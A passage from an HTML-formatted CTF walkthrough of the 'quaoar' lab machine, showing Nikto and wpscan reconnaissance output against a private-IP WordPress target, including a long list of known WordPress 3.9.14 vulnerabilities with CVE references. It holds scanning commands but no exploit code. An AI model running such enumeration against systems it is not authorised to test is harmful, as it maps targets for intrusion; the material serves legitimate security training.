+    <div>+ Target IP:          10.183.0.219</div>
+    <div>+ Target Hostname:    10.183.0.219</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-04-14 20:50:19 (GMT-4)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> (Ubuntu)</div>
+    <div>+ Server may leak inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ Retrieved x-powered-by header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.10-1ubuntu3</font>
+    </div>
+    <div>+ <b>
+            <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</font>
+        </b></div>
+    <div>+ "robots.txt" contains 2 entries which should be manually viewed.</div>
+    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+    <div>+ Uncommon header 'tcn' found, with contents: list</div>
+    <div>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html</div>
+    <div>+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </div>
+    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+    <div>+ 8727 requests: 0 error(s) and 12 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-04-14 20:51:01 (GMT-4) (42 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Nikto reveals some version numbers for Apache and PHP. Nikto also reveals that the robots.txt listed a WordPress site at /wordpress/.</div>
+<div><br /></div>
+<div>Ran wpscan to enumerate issues with the WordPress site.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/quaoar# wpscan --url http://10.183.0.219/wordpress --wp-content-dir wp-content --enumerate</div>
+    <div>_______________________________________________________________</div>
+    <div>        __          _______   _____</div>
+    <div>        \ \        / /  __ \ / ____|</div>
+    <div>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</div>
+    <div>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</div>
+    <div>           \  /\  /  | |     ____) | (__| (_| | | | |</div>
+    <div>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>        WordPress Security Scanner by the WPScan Team</div>
+    <div>                       Version 3.5.1</div>
+    <div>          Sponsored by Sucuri - https://sucuri.net</div>
+    <div>      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</div>
+    <div>_______________________________________________________________</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[i] Updating the Database ...</div>
+    <div>[i] Update completed.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] URL: http://10.183.0.219/wordpress/</div>
+    <div>[+] Started: Sun Apr 14 21:38:01 2019</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Interesting Finding(s):</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] http://10.183.0.219/wordpress/</div>
+    <div> | Interesting Entries:</div>
+    <div> |  - Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> (Ubuntu)</div>
+    <div> |  - X-Powered-By: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.10-1ubuntu3</font>
+    </div>
+    <div> | Found By: Headers (Passive Detection)</div>
+    <div> | Confidence: 100%</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] http://10.183.0.219/wordpress/xmlrpc.php</div>
+    <div> | Found By: Direct Access (Aggressive Detection)</div>
+    <div> | Confidence: 100%</div>
+    <div> | References:</div>
+    <div> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</div>
+    <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</div>
+    <div> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</div>
+    <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</div>
+    <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] http://10.183.0.219/wordpress/readme.html</div>
+    <div> | Found By: Direct Access (Aggressive Detection)</div>
+    <div> | Confidence: 100%</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] Upload directory has listing enabled: http://10.183.0.219/wordpress/wp-content/uploads/</font>
+    </div>
+    <div> | Found By: Direct Access (Aggressive Detection)</div>
+    <div> | Confidence: 100%</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] http://10.183.0.219/wordpress/wp-cron.php</div>
+    <div> | Found By: Direct Access (Aggressive Detection)</div>
+    <div> | Confidence: 60%</div>
+    <div> | References:</div>
+    <div> |  - https://www.iplocation.net/defend-wordpress-from-ddos</div>
+    <div> |  - https://github.com/wpscanteam/wpscan/issues/1299</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).</font>
+    </div>
+    <div> | Detected By: Rss Generator (Passive Detection)</div>
+    <div> |  - http://10.183.0.219/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;</div>
+    <div> |  - http://10.183.0.219/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;</div>
+    <div> |</div>
+    <div> | [!] 38 vulnerabilities identified:</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php</div>
+    <div> |     Fixed in: 3.9.15</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8716</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488</div>
+    <div> |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback</div>
+    <div> |     Fixed in: 3.9.15</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8718</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490</div>
+    <div> |      - https://www.mehmetince.net/low-severity-wordpress/</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 4.7 - Post via Email Checks mail.example.com by Default</div>
+    <div> |     Fixed in: 3.9.15</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8719</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)</div>
+    <div> |     Fixed in: 3.9.15</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8720</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)</div>
+    <div> |     Fixed in: 3.9.15</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8721</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection</font>
+    </div>
+    <div> |     Fixed in: 3.9.16</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8730</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611</div>
+    <div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata</div>
+    <div> |     Fixed in: 3.9.17</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8765</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814</div>
+    <div> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7</div>
+    <div> |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html</div>
+    <div> |      - http://seclists.org/oss-sec/2017/q1/563</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation</div>
+    <div> |     Fixed in: 3.9.17</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8766</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815</div>
+    <div> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8807</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295</div>
+    <div> |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html</div>
+    <div> |      - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html</div>
+    <div> |      - https://core.trac.wordpress.org/ticket/25239</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation</div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8815</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC</div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8816</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks </div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8817</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF</div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8818</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67</div>
+    <div> |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS</div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8819</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6</div>
+    <div> |      - https://hackerone.com/reports/203515</div>
+    <div> |      - https://hackerone.com/reports/203515</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS &amp; CSRF</div>
+    <div> |     Fixed in: 3.9.19</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8820</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063</div>
+    <div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb-&gt;prepare() potential SQL Injection</div>
+    <div> |     Fixed in: 3.9.20</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8905</div>
+    <div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection</font>
+    </div>
+    <div> |     Fixed in: 4.7.5</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8906</div>
+    <div> |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</div>
+    <div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8905</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect</div>
+    <div> |     Fixed in: 3.9.20</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8910</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725</div>
+    <div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div>
+    <div> |      - https://core.trac.wordpress.org/changeset/41398</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping</font>
+    </div>
+    <div> |     Fixed in: 3.9.20</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8911</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719</div>
+    <div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div>
+    <div> |      - https://core.trac.wordpress.org/changeset/41457</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 4.8.2 - $wpdb-&gt;prepare() Weakness</div>
+    <div> |     Fixed in: 3.9.21</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8941</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510</div>
+    <div> |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d</div>
+    <div> |      - https://twitter.com/ircmaxell/status/923662170092638208</div>
+    <div> |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload</div>
+    <div> |     Fixed in: 3.9.22</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8966</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092</div>
+    <div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping</div>
+    <div> |     Fixed in: 3.9.22</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8967</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094</div>
+    <div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing</div>
+    <div> |     Fixed in: 3.9.22</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/8969</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091</div>
+    <div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)</div>
+    <div> |     Fixed in: 3.9.23</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9006</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850</div>
+    <div> |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/</div>
+    <div> |      - https://core.trac.wordpress.org/ticket/42720</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched)</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9021</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389</div>
+    <div> |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html</div>
+    <div> |      - https://github.com/quitten/doser.py</div>
+    <div> |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default</div>
+    <div> |     Fixed in: 3.9.24</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9053</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101</div>
+    <div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login</div>
+    <div> |     Fixed in: 3.9.24</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9054</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100</div>
+    <div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag</div>
+    <div> |     Fixed in: 3.9.24</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9055</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102</div>
+    <div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 4.9.6 - Authenticated Arbitrary File Deletion</div>
+    <div> |     Fixed in: 3.9.25</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9100</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895</div>
+    <div> |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</div>
+    <div> |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd</div>
+    <div> |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/</div>
+    <div> |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9169</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9170</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data</font>
+    </div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9171</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9172</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9173</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9174</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers</div>
+    <div> |     Fixed in: 3.9.26</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9175</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149</div>
+    <div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a</div>
+    <div> |</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution</font>
+    </div>
+    <div> |     Fixed in: 5.0.1</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9222</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</div>
+    <div> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</div>
+    <div> |</div>
+    <div> | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)</div>
+    <div> |     Fixed in: 3.9.27</div>
+    <div> |     References:</div>
+    <div> |      - https://wpvulndb.com/vulnerabilities/9230</div>
+    <div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787</div>
+    <div> |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b</div>
+    <div> |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/</div>
+    <div> |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>[+] WordPress theme in use: twentyfourteen</div>
+    <div> | Location: http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/</div>
+    <div> | Last Updated: 2019-02-21T00:00:00.000Z</div>
+    <div>
+        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] The version is out of date, the latest version is 2.6</font>
+    </div>
+    <div> | Style URL: http://10.183.0.219/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14</div>
+    <div> | Style Name: Twenty Fourteen</div>
+    <div> | Style URI: http://wordpress.org/themes/twentyfourteen</div>
+    <div> | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...</div>
+    <div> | Author: the WordPress team</div>
+    <div> | Author URI: http://wordpress.org/</div>
